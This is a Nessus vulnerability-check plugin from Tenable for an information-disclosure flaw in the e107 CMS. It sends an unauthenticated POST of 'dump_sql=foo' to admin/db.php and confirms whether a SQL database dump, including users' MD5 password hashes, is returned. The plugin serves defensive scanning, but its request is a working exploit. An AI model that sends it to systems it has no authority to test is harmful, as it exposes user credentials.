#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(11805);
  script_version("$Revision: 1.24 $");
  script_cvs_date("$Date: 2016/10/10 15:57:05 $");

  script_bugtraq_id(8273);
  script_osvdb_id(3856);

  script_name(english:"e107 db.php User Database Disclosure");
  script_summary(english:"Attempts to grab a dump of a database file");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a PHP application that suffers from an
information disclosure flaw."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of e107 installed on the remote host is affected by an
information disclosure vulnerability because of a flaw in the
'admin/db.php' script.  This can allow an unauthenticated, remote
attacker to obtain a dump of the SQL database used by e107, by
sending a specially crafted request.  An attacker may use this flaw
to obtain the MD5 hashes of the passwords of the users of the web
site.

Note that the vendor claims the db_dump code requires admin
credentials; however, Nessus was able to exploit this issue without
authentication."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/330332" );
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2003/Jul/62");
  script_set_attribute(attribute:"see_also", value:"http://e107.org/print.php?news.392");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 0.600 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2003/07/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2003/08/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2003/07/24");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:e107:e107");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");

  script_dependencies("e107_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/e107");

  exit(0);
}

# Check starts here

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("audit.inc");

port = get_http_port(default:80, php:TRUE);

data = "dump_sql=foo";

# Test an install.
install = get_install_from_kb(appname:'e107', port:port, exit_on_fail:TRUE);
dir = install['dir'];

# Make sure the affected script exists.
res1 = http_send_recv3(
  method : "GET",
  item   : dir + "/admin/db.php",
  port   : port,
  exit_on_fail : TRUE
);

# If it does...
if (
  ("function openwindow" >< res1[2]) &&
  (">Please log in" >< res1[2])
)
{
  res = http_send_recv3(
    method  : "POST",
    item    : dir + "/admin/db.php",
    version : 11,
    port    : port,
    data    : data,
    content_type : "application/x-www-form-urlencoded",
    exit_on_fail : TRUE
  );

  if ("e107 sql-dump" >< res[2])
  {
    if (report_verbosity > 0)
    {
      snip = crap(data:"-", length:30)+' snip '+crap(data:"-", length:30);
      report =
        '\nNessus was able to verify this issue with the following request :' +
        '\n' +
        '\n' + http_last_sent_request() +
        '\n';
      if (report_verbosity >1)
      {
        report +=
          '\n' +
          '\nThis produced the following truncated output : ' +
          '\n' +
          '\n' + snip +
          '\n' + beginning_of_response(resp:res[2], max_lines:'15')  +
          '\n' + snip +
          '\n';
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, "e107", build_url(qs:dir, port:port));
